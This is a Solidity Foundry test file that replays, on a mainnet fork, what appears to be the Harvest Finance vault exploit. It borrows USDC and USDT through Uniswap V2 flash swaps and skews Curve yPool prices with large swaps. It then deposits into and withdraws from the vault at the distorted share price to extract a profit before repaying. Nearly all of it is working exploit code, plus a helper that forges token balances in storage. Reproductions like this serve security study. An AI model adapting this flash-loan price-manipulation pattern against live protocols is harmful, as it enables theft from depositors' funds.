// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "src/interfaces/ICurve.sol";
import "src/interfaces/harvest/IVault.sol";

contract ContractTest is Test {
    using SafeERC20 for ERC20;

    uint256 constant decimal = 6;
    uint256 constant decimaln = 10 ** 6;
    ERC20 usdc;
    ERC20 usdt;
    ERC20 weth9;
    IStableSwap yPool;
    IVault vaultUSDC;
    IUniswapV2Factory factory;
    IUniswapV2Pair usdcPair;
    IUniswapV2Pair usdtPair;

    address attackerAddress = address(this);

    function setUp() public {
        vm.createSelectFork("mainnet", 11129473);
        usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        weth9 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        yPool = IStableSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
        vaultUSDC = IVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
        factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
        usdcPair =
            IUniswapV2Pair(factory.getPair(address(usdc), address(weth9)));
        usdtPair =
            IUniswapV2Pair(factory.getPair(address(usdt), address(weth9)));
    }

    function testAttack() public {
        vm.startPrank(attackerAddress);
        vm.deal(attackerAddress, 10000000 ether);
        emit log_uint(
            address(0x5485798748221719181499103911646299086586).balance
            );
        vm.stopPrank();
    }

    function testFlashSwap() public {
        vm.startPrank(attackerAddress);

        usdcPair.swap(50000000 * decimaln, 0, address(this), "0");
        vm.stopPrank();
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    )
        external
    {
        if (msg.sender == address(usdcPair)) {
            usdtPair.swap(0, 18300000 * decimaln, address(this), "0");
            uint256 requiredAmount = amount0 + amount0 / 1000 * 4;
            usdc.transfer(msg.sender, requiredAmount);
            emit log_named_decimal_uint(
                "end USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_string("finish USDC");
        } else if (msg.sender == address(usdtPair)) {
            uint256 requiredAmount = amount1 + amount1 / 1000 * 3;

            IUniswapV2Pair pair = IUniswapV2Pair(msg.sender);
            emit log_named_decimal_uint(
                "before USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_named_decimal_uint(
                "before USDT", usdt.balanceOf(address(this)), decimal
                );
            usdc.approve(address(yPool), type(uint256).max);
            usdt.safeApprove(address(yPool), type(uint256).max);
            usdc.approve(address(vaultUSDC), type(uint256).max);
            usdt.safeApprove(address(vaultUSDC), type(uint256).max);

            yPool.exchange_underlying(2, 1, 18200000 * decimaln, 0);

            emit log_named_decimal_uint(
                "now USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_named_decimal_uint(
                "now USDT", usdt.balanceOf(address(this)), decimal
                );
            vaultUSDC.deposit(50000000 * decimaln);

            emit log_named_decimal_uint(
                "now2 USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_named_decimal_uint(
                "now2 USDT", usdt.balanceOf(address(this)), decimal
                );
            yPool.exchange_underlying(1, 2, 17000000 * decimaln, 0);

            emit log_named_decimal_uint(
                "now3 USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_named_decimal_uint(
                "now3 USDT", usdt.balanceOf(address(this)), decimal
                );
            vaultUSDC.withdraw(vaultUSDC.balanceOf(address(this)));
            // vaultUSDC.withdraw(51321000 * decimaln);
            // vaultUSDC.withdrawAll();

            // dealERC20(address(usdt), 2, 19000000 * decimaln);
            emit log_named_decimal_uint(
                "after USDC", usdc.balanceOf(address(this)), decimal
                );
            emit log_named_decimal_uint(
                "after USDT", usdt.balanceOf(address(this)), decimal
                );

            uint256 swapRequiredAmount =
                requiredAmount - usdt.balanceOf(address(this));
            yPool.exchange_underlying(
                1, 2, swapRequiredAmount / 10 * 11, swapRequiredAmount
            );
            emit log_named_decimal_uint(
                "swapped USDT", usdt.balanceOf(address(this)), decimal
                );

            usdt.safeTransfer(msg.sender, usdt.balanceOf(address(this)));
            emit log_named_decimal_uint(
                "end USDT", usdt.balanceOf(address(this)), decimal
                );
            emit log_string("finish USDT");
        }
    }

    function dealERC20(
        address tokenAddress,
        uint256 balancesSlotUint,
        uint256 value
    )
        public
    {
        ERC20 token = ERC20(tokenAddress);
        emit log_string(token.symbol());
        emit log_named_uint("balance", token.balanceOf(attackerAddress));
        bytes32 balancesSlot = bytes32(uint256(balancesSlotUint));
        assertEq(vm.load(tokenAddress, balancesSlot), bytes32(0));
        bytes32 attackerTokenBalanceSlot = keccak256(
            bytes.concat(bytes32(uint256(uint160(attackerAddress))), balancesSlot)
        );
        vm.store(tokenAddress, attackerTokenBalanceSlot, bytes32(value));
        emit log_named_uint("balance", token.balanceOf(attackerAddress));
    }
}